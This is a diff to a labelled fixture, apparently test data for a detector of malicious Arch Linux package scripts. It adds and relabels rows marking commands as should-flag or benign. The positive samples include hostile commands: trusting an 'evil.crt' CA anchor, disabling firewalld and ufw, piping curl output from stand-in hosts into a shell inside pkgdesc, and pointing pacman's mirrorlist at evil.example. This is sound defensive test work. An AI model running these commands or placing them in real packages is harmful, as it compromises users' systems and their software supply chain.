@@ -177,7 +177,7 @@ keyring-tamper	-	build	echo "pacman-key is not needed"
 gpg-import	+	build	gpg --recv-keys ABCD
 gpg-import	-	build	gpg --verify x.sig x
 ca-trust	+	install	trust anchor /tmp/evil.crt
-ca-trust	+	install	update-ca-trust
+ca-trust	-	install	update-ca-trust
 ca-trust	-	build	install -Dm644 ca.crt "$pkgdir/usr/share/doc/x/ca.crt"
 security-off	+	install	systemctl disable --now firewalld
 security-off	+	install	ufw disable
@@ -229,3 +229,8 @@ pipe-to-shell	+	top	pkgdesc="$(curl -s https://x.example/i | sh)"
 pipe-to-shell	+	top	pkgdesc="x"; curl -s https://e.example/x | bash
 sudo-in-pkg	+	top	pkgdesc='x' && sudo cp x /usr/bin/x
 detach	-	top	pkgdesc="Run things with nohup" # plain, commented
+ca-trust	+	install	cp evil.crt /etc/ca-certificates/trust-source/anchors/
+pacman-tamper	+	install	echo 'Server = http://evil.example/$repo' >> /etc/pacman.d/mirrorlist
+pacman-tamper	+	install	cp x.conf /etc/pacman.d/x.conf
+pacman-tamper	-	build	grep -q Server /etc/pacman.d/mirrorlist
+pacman-tamper	-	install	cat /etc/pacman.conf
